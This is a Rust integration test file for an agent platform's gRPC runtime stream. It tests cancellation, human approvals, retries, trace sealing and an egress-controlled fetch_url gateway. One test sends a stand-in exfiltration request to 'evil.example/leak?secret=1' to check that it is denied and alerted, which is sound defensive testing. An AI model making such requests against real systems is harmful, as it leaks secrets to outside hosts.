//! The gRPC wire to the agent runtime (AgentSecOps phase 4, CONTRACT §8):
//! a run executes over `AgentRuntime/Execute` with its spans live and its
//! chain sealed, a cancel goes down the stream as a command, an approval
//! is asked for and decided through the stream, a dropped stream fails the
//! node cleanly, and a gateway tool request is performed by the backend and
//! answered with a result, with the `tool_call` and `egress` spans on the
//! record. `make prove-gateway` measures the stream's per-event latency
//! against the NDJSON wire.
#![forbid(unsafe_code)]

mod common;

use std::sync::Arc;
use std::time::{Duration, Instant};

use axum::Router;
use axum::http::{Method, StatusCode};
use axum::routing::get;
use common::grpc_runtime::fake_grpc_runtime;
use common::{TestApp, collect_until};
use serde_json::{Value, json};
use sqlx::PgPool;

async fn call(
    app: &TestApp,
    method: Method,
    path: &str,
    token: &str,
    body: Option<Value>,
) -> (StatusCode, Value) {
    let r = app
        .request(method, &format!("/api/v1{path}"), Some(token), body)
        .await;
    (r.status, r.body)
}

async fn workspace(app: &TestApp, token: &str) -> String {
    let (_, list) = call(app, Method::GET, "/workspaces", token, None).await;
    list[0]["id"].as_str().unwrap().to_owned()
}

async fn agent(app: &TestApp, token: &str, name: &str, role: &str, capabilities: Value) -> Value {
    let (status, agent) = call(
        app,
        Method::POST,
        "/agents",
        token,
        Some(json!({
            "name": name, "role": role, "runtime": "python",
            "purpose": format!("Handles {role} work in tests."),
            "capabilities": capabilities,
        })),
    )
    .await;
    assert_eq!(status, StatusCode::CREATED, "{agent}");
    agent
}

/// Starts a run and returns its id with the events up to `run.finished`.
async fn run(app: &TestApp, token: &str, gid: &str) -> (String, Vec<(String, Value)>) {
    let mut rx = app.events(gid);
    let (status, body) = call(
        app,
        Method::POST,
        &format!("/graphs/{gid}/runs"),
        token,
        Some(json!({"force": true})),
    )
    .await;
    assert_eq!(status, StatusCode::ACCEPTED, "{body}");
    let rid = body["id"].as_str().unwrap().to_owned();
    let events = collect_until(&mut rx, "run.finished").await;
    (rid, events)
}

async fn spans_of(app: &TestApp, token: &str, rid: &str) -> Vec<Value> {
    let (status, page) = call(
        app,
        Method::GET,
        &format!("/runs/{rid}/trace?limit=1000"),
        token,
        None,
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{page}");
    page["spans"].as_array().unwrap().clone()
}

async fn verified(app: &TestApp, token: &str, rid: &str) -> Value {
    let (status, body) = call(
        app,
        Method::GET,
        &format!("/runs/{rid}/trace/verify"),
        token,
        None,
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{body}");
    body
}

/// An app whose runtime is the gRPC stand-in.
async fn grpc_app(pool: PgPool, url: &str) -> TestApp {
    TestApp::new(
        pool,
        &[
            ("NEXC_RUNTIME_PROTOCOL", "grpc"),
            ("NEXC_RUNTIME_GRPC_URL", url),
        ],
    )
    .await
}

/// A graph with one agent node of `title`, run by `role`.
async fn graph_with(app: &TestApp, token: &str, title: &str, role: &str) -> (String, String) {
    let gid = app.graph(token, "Prove the stream").await;
    let node = app
        .node(
            token,
            &gid,
            json!({"title": title, "kind": "task", "executor": "agent", "agent_role": role}),
        )
        .await;
    (gid, node)
}

#[sqlx::test(migrator = "nexc::repo::MIGRATOR")]
async fn a_run_executes_over_grpc_with_its_spans_live_and_its_chain_sealed(pool: PgPool) {
    let (url, seen) = fake_grpc_runtime().await;
    let app = grpc_app(pool, &url).await;
    let (token, _) = app.register("owner@example.com").await;
    let wid = workspace(&app, &token).await;
    agent(
        &app,
        &token,
        "Scribe",
        "scribe",
        json!({"tools": ["write_file", "finish", "fetch_url"]}),
    )
    .await;
    let (gid, node) = graph_with(&app, &token, "Quarterly note", "scribe").await;
    let (rid, events) = run(&app, &token, &gid).await;
    let finished = &events.last().unwrap().1["run"];
    assert_eq!(finished["status"], "succeeded", "{finished}");
    assert_eq!(finished["node_runs"][0]["status"], "succeeded");
    assert_eq!(finished["node_runs"][0]["tokens_in"], 10);

    // The request went down the stream with the token and the gateway tools the policy allows.
    let requests = seen.requests.lock().unwrap().clone();
    assert_eq!(requests.len(), 1);
    let request = &requests[0];
    assert_eq!(request["run_id"], rid);
    assert_eq!(request["node_id"], node);
    assert_eq!(
        request["agent"]["principal"],
        format!("agent://{wid}/Scribe")
    );
    assert!(request["token"].as_str().unwrap().split('.').count() == 3);
    assert_eq!(request["task"]["title"], "Quarterly note");
    assert_eq!(request["llm"]["provider"], "anthropic");
    let offered: Vec<&str> = request["gateway_tools"]
        .as_array()
        .unwrap()
        .iter()
        .map(|t| t["name"].as_str().unwrap())
        .collect();
    assert_eq!(offered, ["fetch_url"], "the allow-list names it");

    // Live: delta, tokens, the artifact and every span reached the stream in chain order.
    let kinds: Vec<&str> = events.iter().map(|(e, _)| e.as_str()).collect();
    assert!(kinds.contains(&"node.output") && kinds.contains(&"artifact.created"));
    let live: Vec<&Value> = events
        .iter()
        .filter(|(e, _)| e == "trace.span")
        .map(|(_, d)| &d["span"])
        .collect();
    let seqs: Vec<i64> = live.iter().map(|s| s["seq"].as_i64().unwrap()).collect();
    assert_eq!(seqs, (0..live.len() as i64).collect::<Vec<_>>());
    let spans = spans_of(&app, &token, &rid).await;
    let kinds: Vec<&str> = spans.iter().map(|s| s["kind"].as_str().unwrap()).collect();
    assert!(
        kinds.contains(&"data_read") && kinds.contains(&"llm_call") && kinds.contains(&"tool_call")
    );
    let tool = spans.iter().find(|s| s["kind"] == "tool_call").unwrap();
    assert_eq!(tool["name"], "write_file");
    assert_eq!(
        tool["attributes"]["args_bytes"], 12,
        "attributes travel as recorded"
    );
    assert!(
        tool["parent_id"].is_string(),
        "the tool call hangs under its turn"
    );
    assert_eq!(verified(&app, &token, &rid).await["ok"], true);
    assert_eq!(finished["policy_mismatches"], 0);
    let (status, artifacts) = call(
        &app,
        Method::GET,
        &format!("/runs/{rid}/artifacts"),
        &token,
        None,
    )
    .await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(artifacts[0]["path"], "deliverable.md");
}

#[sqlx::test(migrator = "nexc::repo::MIGRATOR")]
async fn cancelling_a_run_sends_cancel_down_the_stream(pool: PgPool) {
    let (url, seen) = fake_grpc_runtime().await;
    let app = grpc_app(pool, &url).await;
    let (token, _) = app.register("owner@example.com").await;
    agent(&app, &token, "Scribe", "scribe", json!({})).await;
    let (gid, _) = graph_with(&app, &token, "SLOW note", "scribe").await;
    let mut rx = app.events(&gid);
    let (status, body) = call(
        &app,
        Method::POST,
        &format!("/graphs/{gid}/runs"),
        &token,
        Some(json!({})),
    )
    .await;
    assert_eq!(status, StatusCode::ACCEPTED, "{body}");
    let rid = body["id"].as_str().unwrap().to_owned();
    // The runtime is working (its delta arrived) before the cancel.
    let before = collect_until(&mut rx, "node.output").await;
    assert!(before.iter().any(|(e, _)| e == "node.output"));
    let (status, cancelled) = call(
        &app,
        Method::POST,
        &format!("/runs/{rid}/cancel"),
        &token,
        None,
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{cancelled}");
    let events = collect_until(&mut rx, "run.finished").await;
    let finished = &events.last().unwrap().1["run"];
    assert_eq!(finished["status"], "cancelled", "{finished}");
    assert_eq!(finished["node_runs"][0]["status"], "cancelled");
    // The runtime was told, rather than finding its connection reset.
    let deadline = Instant::now() + Duration::from_secs(5);
    while Instant::now() < deadline && !seen.commands.lock().unwrap().iter().any(|c| c == "cancel")
    {
        tokio::time::sleep(Duration::from_millis(20)).await;
    }
    let commands = seen.commands.lock().unwrap().clone();
    assert!(commands.contains(&"cancel".to_owned()), "{commands:?}");
    assert_eq!(verified(&app, &token, &rid).await["ok"], true);
}

#[sqlx::test(migrator = "nexc::repo::MIGRATOR")]
async fn an_approval_is_asked_for_and_decided_through_the_stream(pool: PgPool) {
    let (url, seen) = fake_grpc_runtime().await;
    let app = grpc_app(pool, &url).await;
    let (token, _) = app.register("owner@example.com").await;
    let wid = workspace(&app, &token).await;
    let (status, policy) = call(
        &app,
        Method::POST,
        &format!("/workspaces/{wid}/policies"),
        &token,
        Some(json!({"scope": "workspace", "scope_id": null,
            "document": {"require_approval": {"tools": ["make_docx"], "timeout_s": 60}}})),
    )
    .await;
    assert_eq!(status, StatusCode::CREATED, "{policy}");
    agent(&app, &token, "Scribe", "scribe", json!({})).await;
    let (gid, node) = graph_with(&app, &token, "APPROVAL report", "scribe").await;
    let mut rx = app.events(&gid);
    let (status, body) = call(
        &app,
        Method::POST,
        &format!("/graphs/{gid}/runs"),
        &token,
        Some(json!({})),
    )
    .await;
    assert_eq!(status, StatusCode::ACCEPTED, "{body}");
    let rid = body["id"].as_str().unwrap().to_owned();
    let waiting = collect_until(&mut rx, "node.status").await;
    let mut waiting = waiting;
    while !waiting
        .iter()
        .any(|(e, d)| e == "node.status" && d["status"] == "waiting_approval")
    {
        waiting.extend(collect_until(&mut rx, "node.status").await);
    }
    let (status, pending) = call(
        &app,
        Method::GET,
        &format!("/workspaces/{wid}/approvals?status=pending"),
        &token,
        None,
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{pending}");
    let approval = &pending.as_array().unwrap()[0];
    assert_eq!(approval["tool"], "make_docx");
    assert_eq!(approval["run_id"], rid);
    assert_eq!(approval["node_id"], node);
    let approval_id = approval["id"].as_str().unwrap().to_owned();
    // The request was acknowledged down the stream before anyone decided.
    assert!(seen.commands.lock().unwrap().contains(&"ack".to_owned()));
    let (status, decided) = call(
        &app,
        Method::POST,
        &format!("/approvals/{approval_id}/approve"),
        &token,
        Some(json!({"reason": "go ahead"})),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{decided}");
    let events = collect_until(&mut rx, "run.finished").await;
    let finished = &events.last().unwrap().1["run"];
    assert_eq!(finished["status"], "succeeded", "{finished}");
    assert!(
        events
            .iter()
            .any(|(e, d)| e == "node.status" && d["status"] == "running"),
        "the node resumed"
    );
    let commands = seen.commands.lock().unwrap().clone();
    assert!(
        commands.contains(&"approval_decision".to_owned()),
        "{commands:?}"
    );
    let spans = spans_of(&app, &token, &rid).await;
    let asked = spans
        .iter()
        .find(|s| s["kind"] == "policy" && s["attributes"]["decision"] == "require_approval")
        .expect("the request span");
    assert_eq!(asked["attributes"]["approval_id"], approval_id);
    let decision = spans
        .iter()
        .find(|s| s["kind"] == "approval")
        .expect("the decision span");
    assert_eq!(decision["attributes"]["decision"], "approved");
    assert_eq!(decision["attributes"]["decided_by_name"], "Test");
    assert_eq!(
        decision["parent_id"], asked["parent_id"],
        "under the same turn"
    );
    let ran = spans
        .iter()
        .find(|s| s["kind"] == "tool_call" && s["name"] == "make_docx")
        .expect("the held tool ran");
    assert_eq!(ran["attributes"]["approval_id"], approval_id);
    assert_eq!(finished["policy_mismatches"], 0, "approved, so no mismatch");
    assert_eq!(verified(&app, &token, &rid).await["ok"], true);
}

#[sqlx::test(migrator = "nexc::repo::MIGRATOR")]
async fn a_dropped_stream_fails_the_node_cleanly(pool: PgPool) {
    let (url, seen) = fake_grpc_runtime().await;
    let app = grpc_app(pool, &url).await;
    let (token, _) = app.register("owner@example.com").await;
    agent(&app, &token, "Scribe", "scribe", json!({})).await;
    let (gid, _) = graph_with(&app, &token, "DROP note", "scribe").await;
    let (rid, events) = run(&app, &token, &gid).await;
    let finished = &events.last().unwrap().1["run"];
    assert_eq!(finished["status"], "failed", "{finished}");
    let node_run = &finished["node_runs"][0];
    assert_eq!(node_run["status"], "failed");
    assert!(
        node_run["error"]
            .as_str()
            .unwrap()
            .contains("stream ended without a result"),
        "{node_run}"
    );
    // A transient failure: the second attempt reconnected (and was dropped again).
    assert_eq!(node_run["attempt"], 2);
    assert_eq!(seen.requests.lock().unwrap().len(), 2);
    assert!(
        events
            .iter()
            .any(|(e, d)| e == "node.log" && d["message"].as_str().unwrap().contains("retrying")),
        "the retry was announced"
    );
    assert_eq!(
        verified(&app, &token, &rid).await["ok"],
        true,
        "sealed all the same"
    );
}

/// A small HTTP server the gateway may fetch from: JSON at `/status`, a
/// redirect at `/moved`, a binary at `/image`, something large at `/large`.
async fn fetchable() -> (String, u16) {
    let app = Router::new()
        .route(
            "/status",
            get(|| async { axum::Json(json!({"ok": true, "service": "fetchable"})) }),
        )
        .route(
            "/moved",
            get(|| async { axum::response::Redirect::permanent("/status") }),
        )
        .route(
            "/image",
            get(|| async {
                (
                    [("content-type", "image/png")],
                    vec![0x89u8, b'P', b'N', b'G'],
                )
            }),
        )
        .route(
            "/large",
            get(|| async {
                (
                    [("content-type", "text/plain")],
                    "x".repeat(2 * 1024 * 1024),
                )
            }),
        );
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let port = listener.local_addr().unwrap().port();
    tokio::spawn(async move { axum::serve(listener, app).await.unwrap() });
    (format!("http://127.0.0.1:{port}"), port)
}

#[sqlx::test(migrator = "nexc::repo::MIGRATOR")]
async fn a_gateway_tool_request_is_performed_by_the_backend_and_answered(pool: PgPool) {
    let (url, seen) = fake_grpc_runtime().await;
    let (site, _) = fetchable().await;
    let app = grpc_app(pool, &url).await;
    let (token, _) = app.register("owner@example.com").await;
    let wid = workspace(&app, &token).await;
    // The private address is reached because the allow-list names it exactly.
    agent(
        &app,
        &token,
        "Fetcher",
        "fetcher",
        json!({"egress_hosts": ["127.0.0.1", "api.example.com"]}),
    )
    .await;
    let gid = app.graph(&token, "Fetch things").await;
    let ok = app
        .node(
            &token,
            &gid,
            json!({"title": "TOOL fetch_url", "kind": "task", "executor": "agent", "agent_role": "fetcher",
                "content": json!({"url": format!("{site}/moved")}).to_string()}),
        )
        .await;
    let (rid, events) = run(&app, &token, &gid).await;
    let finished = &events.last().unwrap().1["run"];
    assert_eq!(finished["status"], "succeeded", "{finished}");
    let answered = seen.tool_results.lock().unwrap().clone();
    assert_eq!(answered.len(), 1);
    let (_, output, is_error) = answered[0].clone();
    assert!(!is_error, "{output}");
    assert!(output.starts_with("HTTP 200 application/json"), "{output}");
    assert!(output.contains("\"service\":\"fetchable\""), "{output}");
    let commands = seen.commands.lock().unwrap().clone();
    assert_eq!(
        commands.iter().filter(|c| *c == "ack").count(),
        1,
        "the request was acknowledged first: {commands:?}"
    );
    let spans = spans_of(&app, &token, &rid).await;
    let tool = spans
        .iter()
        .find(|s| s["kind"] == "tool_call" && s["name"] == "fetch_url")
        .expect("the backend recorded the call");
    assert_eq!(tool["node_id"], ok);
    assert_eq!(tool["attributes"]["gateway"], true);
    assert_eq!(tool["attributes"]["is_error"], false);
    assert_eq!(tool["principal"], format!("agent://{wid}/Fetcher"));
    assert!(tool["parent_id"].is_string(), "under the runtime's turn");
    let egress = spans
        .iter()
        .find(|s| s["kind"] == "egress")
        .expect("the egress span names the host");
    assert_eq!(egress["name"], "127.0.0.1");
    assert_eq!(egress["attributes"]["host"], "127.0.0.1");
    assert_eq!(egress["attributes"]["status"], 200);
    assert_eq!(egress["parent_id"], tool["id"]);
    assert_eq!(egress["attributes"]["tool"], "fetch_url");
    assert!(
        egress["attributes"]["url"]
            .as_str()
            .unwrap()
            .ends_with("/status"),
        "after the redirect: {egress}"
    );
    assert_eq!(finished["policy_mismatches"], 0);
    assert_eq!(verified(&app, &token, &rid).await["ok"], true);

    // A host outside the allow-list: refused, on the record, and an alert.
    let gid = app.graph(&token, "Fetch elsewhere").await;
    app.node(
        &token,
        &gid,
        json!({"title": "TOOL fetch_url", "kind": "task", "executor": "agent", "agent_role": "fetcher",
            "content": json!({"url": "https://evil.example/leak?secret=1"}).to_string()}),
    )
    .await;
    let (rid, events) = run(&app, &token, &gid).await;
    assert_eq!(events.last().unwrap().1["run"]["status"], "succeeded");
    let answered = seen.tool_results.lock().unwrap().clone();
    let (_, refused, is_error) = answered
        .iter()
        .find(|(_, output, _)| output.contains("evil.example"))
        .cloned()
        .expect("the refusal reached the runtime");
    assert!(is_error, "{refused}");
    assert!(refused.contains("egress.hosts"), "{refused}");
    let spans = spans_of(&app, &token, &rid).await;
    let denial = spans
        .iter()
        .find(|s| s["kind"] == "policy" && s["name"] == "evil.example")
        .expect("the denial is a policy span");
    assert_eq!(denial["attributes"]["decision"], "deny");
    assert_eq!(denial["attributes"]["action"], "egress");
    assert_eq!(denial["attributes"]["gateway"], true);
    assert!(
        !spans.iter().any(|s| s["kind"] == "egress"),
        "nothing left the platform"
    );
    let (_, alerts) = call(
        &app,
        Method::GET,
        &format!("/workspaces/{wid}/alerts"),
        &token,
        None,
    )
    .await;
    assert!(
        alerts
            .as_array()
            .unwrap()
            .iter()
            .any(|a| a["rule"] == "egress.hosts" && a["run_id"] == rid),
        "{alerts}"
    );
}

#[sqlx::test(migrator = "nexc::repo::MIGRATOR")]
async fn the_gateway_refuses_what_the_policy_does_not_offer(pool: PgPool) {
    let (url, seen) = fake_grpc_runtime().await;
    let (site, _) = fetchable().await;
    let app = grpc_app(pool, &url).await;
    let (token, _) = app.register("owner@example.com").await;
    // The agent may not use fetch_url at all: the runtime should never ask, so a request is a
    // mismatch on the record, and nothing is fetched.
    agent(
        &app,
        &token,
        "Clerk",
        "clerk",
        json!({"tools": ["write_file", "finish"], "egress_hosts": ["127.0.0.1"]}),
    )
    .await;
    let gid = app.graph(&token, "Overstep").await;
    app.node(
        &token,
        &gid,
        json!({"title": "TOOL fetch_url", "kind": "task", "executor": "agent", "agent_role": "clerk",
            "content": json!({"url": format!("{site}/status")}).to_string()}),
    )
    .await;
    let (rid, events) = run(&app, &token, &gid).await;
    let finished = &events.last().unwrap().1["run"];
    assert_eq!(finished["status"], "succeeded");
    assert_eq!(finished["policy_mismatches"], 1, "{finished}");
    let (_, _, is_error) = seen.tool_results.lock().unwrap()[0].clone();
    assert!(is_error);
    let request = seen.requests.lock().unwrap()[0].clone();
    assert_eq!(
        request["gateway_tools"].as_array().unwrap().len(),
        0,
        "not offered: {request}"
    );
    let spans = spans_of(&app, &token, &rid).await;
    assert!(spans.iter().any(|s| s["name"] == "policy_mismatch"));
    assert!(!spans.iter().any(|s| s["kind"] == "egress"));

    // Binary and oversized answers are not passed on; the span still says what was reached.
    agent(
        &app,
        &token,
        "Reader",
        "reader",
        json!({"egress_hosts": ["127.0.0.1"]}),
    )
    .await;
    for (path, expected) in [("/image", "image/png"), ("/large", "larger than")] {
        let gid = app.graph(&token, "Fetch oddities").await;
        app.node(
            &token,
            &gid,
            json!({"title": "TOOL fetch_url", "kind": "task", "executor": "agent", "agent_role": "reader",
                "content": json!({"url": format!("{site}{path}")}).to_string()}),
        )
        .await;
        let (rid, _) = run(&app, &token, &gid).await;
        let spans = spans_of(&app, &token, &rid).await;
        let tool = spans
            .iter()
            .find(|s| s["kind"] == "tool_call" && s["name"] == "fetch_url")
            .unwrap();
        assert_eq!(tool["attributes"]["is_error"], true, "{path}: {tool}");
        let latest = seen.tool_results.lock().unwrap().last().cloned().unwrap();
        assert!(latest.1.contains(expected), "{path}: {}", latest.1);
    }
}

/// Percentile of sorted samples.
fn pct(sorted: &[f64], p: f64) -> f64 {
    let rank = ((p / 100.0) * (sorted.len() as f64 - 1.0)).round() as usize;
    sorted[rank.min(sorted.len() - 1)]
}

/// `make prove-gateway`, second half: the stream's per-event latency. The
/// stand-in runtime sends 2,000 deltas as fast as it can; the time from each
/// send to its `node.output` fan-out, as a subscriber of the graph sees it,
/// is measured over gRPC here and over NDJSON in the test below.
#[sqlx::test(migrator = "nexc::repo::MIGRATOR")]
#[ignore = "a measurement: run with `make prove-gateway`"]
async fn prove_stream_latency_grpc(pool: PgPool) {
    let (url, seen) = fake_grpc_runtime().await;
    let app = grpc_app(pool, &url).await;
    let (token, _) = app.register("prover@example.com").await;
    agent(&app, &token, "Burster", "burster", json!({})).await;
    let (gid, _) = graph_with(&app, &token, &format!("BURST {DELTAS}"), "burster").await;
    let samples = measure_burst(&app, &token, &gid, &seen.burst_sent).await;
    report("grpc", samples);
}

/// The same measurement over the NDJSON wire.
#[sqlx::test(migrator = "nexc::repo::MIGRATOR")]
#[ignore = "a measurement: run with `make prove-gateway`"]
async fn prove_stream_latency_ndjson(pool: PgPool) {
    let (url, sent) = burst_ndjson_runtime().await;
    let app = TestApp::new(pool, &[("NEXC_RUNTIME_URL", &url)]).await;
    let (token, _) = app.register("prover@example.com").await;
    agent(&app, &token, "Burster", "burster", json!({})).await;
    let (gid, _) = graph_with(&app, &token, &format!("BURST {DELTAS}"), "burster").await;
    let samples = measure_burst(&app, &token, &gid, &sent).await;
    report("ndjson", samples);
}

/// Deltas of one measured burst.
const DELTAS: usize = 2_000;

fn report(wire: &str, mut samples: Vec<f64>) {
    samples.sort_by(f64::total_cmp);
    println!(
        "prove-gateway: stream per-event latency over {wire}, {DELTAS} deltas from the stand-in runtime to the graph's event stream (send -> node.output fan-out): p50 {:.0} µs, p99 {:.0} µs, max {:.0} µs",
        pct(&samples, 50.0),
        pct(&samples, 99.0),
        samples.last().copied().unwrap_or(0.0)
    );
}

/// Runs a `BURST` graph and returns the per-delta latencies (µs).
async fn measure_burst(
    app: &TestApp,
    token: &str,
    gid: &str,
    sent: &std::sync::Mutex<Vec<Instant>>,
) -> Vec<f64> {
    let deltas = DELTAS;
    sent.lock().unwrap().clear();
    let mut rx = app.events(gid);
    let (status, body) = call(
        app,
        Method::POST,
        &format!("/graphs/{gid}/runs"),
        token,
        Some(json!({"force": true})),
    )
    .await;
    assert_eq!(status, StatusCode::ACCEPTED, "{body}");
    let mut received: Vec<(usize, Instant)> = Vec::with_capacity(deltas);
    loop {
        let frame = tokio::time::timeout(Duration::from_secs(60), rx.recv())
            .await
            .expect("the run finishes")
            .expect("hub open");
        let at = Instant::now();
        if &*frame.event == "node.output" {
            let data: Value = serde_json::from_str(&frame.data).unwrap();
            if let Some(index) = data["delta"]
                .as_str()
                .and_then(|d| d.trim().strip_prefix('d'))
                .and_then(|n| n.parse::<usize>().ok())
            {
                received.push((index, at));
            }
        } else if &*frame.event == "run.finished" {
            break;
        }
    }
    let sent = sent.lock().unwrap().clone();
    assert_eq!(received.len(), deltas, "every delta was fanned out");
    received
        .iter()
        .map(|(i, at)| at.duration_since(sent[*i]).as_secs_f64() * 1e6)
        .collect()
}

/// An NDJSON stand-in that answers a `BURST <n>` title with `n` deltas,
/// recording when each was written to the socket.
async fn burst_ndjson_runtime() -> (String, Arc<std::sync::Mutex<Vec<Instant>>>) {
    use axum::body::Body;
    use axum::http::{HeaderMap, header};
    use axum::response::IntoResponse;
    use axum::routing::post;
    use bytes::Bytes;

    let sent: Arc<std::sync::Mutex<Vec<Instant>>> = Arc::default();
    let recorder = sent.clone();
    let execute = move |headers: HeaderMap, axum::Json(req): axum::Json<Value>| {
        let sent = recorder.clone();
        async move {
            let authorized = headers
                .get(header::AUTHORIZATION)
                .and_then(|v| v.to_str().ok())
                == Some(&format!("Bearer {}", common::RUNTIME_TOKEN));
            if !authorized {
                return StatusCode::UNAUTHORIZED.into_response();
            }
            let title = req["task"]["title"].as_str().unwrap_or("").to_owned();
            let n: usize = title
                .strip_prefix("BURST ")
                .and_then(|n| n.parse().ok())
                .unwrap_or(0);
            let stream = async_stream::stream! {
                for i in 0..n {
                    if i % 32 == 31 {
                        tokio::time::sleep(Duration::from_millis(1)).await;
                    } else {
                        tokio::task::yield_now().await;
                    }
                    sent.lock().unwrap().push(Instant::now());
                    let line = format!("{}\n", json!({"type": "delta", "text": format!("d{i} ")}));
                    yield Ok::<_, std::io::Error>(Bytes::from(line));
                }
                let last = format!("{}\n", json!({"type": "result", "output": "[runtime] burst", "tokens_in": 10, "tokens_out": 5}));
                yield Ok(Bytes::from(last));
            };
            (
                [(header::CONTENT_TYPE, "application/x-ndjson")],
                Body::from_stream(stream),
            )
                .into_response()
        }
    };
    let app = Router::new().route("/v1/execute", post(execute));
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let url = format!("http://{}", listener.local_addr().unwrap());
    tokio::spawn(async move { axum::serve(listener, app).await.unwrap() });
    (url, sent)
}
